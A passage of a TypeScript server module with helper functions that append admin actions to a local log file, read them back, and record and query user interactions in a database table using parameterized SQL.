  try {
    await fs.promises.appendFile(dbPath, logLine, 'utf8');
  } catch (err) {
    console.error("Failed to append to admin action log file:", err);
  }
}

export async function getAdminLogs(): Promise<string[]> {
  const dbPath = path.join(process.cwd(), 'admin.log');
  if (!fs.existsSync(dbPath)) return [];
  try {
    const contents = await fs.promises.readFile(dbPath, 'utf8');
    return contents.trim().split('\n').filter(Boolean);
  } catch (err) {
    console.error("Failed to read admin action logs:", err);
    return [];
  }
}

export async function logUserInteraction(
  userId: number | null, 
  email: string | null, 
  actionType: string, 
  description: string, 
  ipAddress = "127.0.0.1"
) {
  if (!dbInstance) return;
  try {
    await dbInstance!.run(
      `INSERT INTO user_interactions (user_id, email, action_type, description, ip_address, created_at)
       VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`,
      [userId, email, actionType, description, ipAddress]
    );
  } catch (err) {
    console.error("Failed to log user interaction in db:", err);
  }
}

export async function getUserInteractions(): Promise<any[]> {
  if (!dbInstance) return [];
  try {
    return await dbInstance!.all(`SELECT * FROM user_interactions ORDER BY id DESC`);
  } catch (err) {
    console.error("Failed to query user interactions in db:", err);
    return [];
  }
}
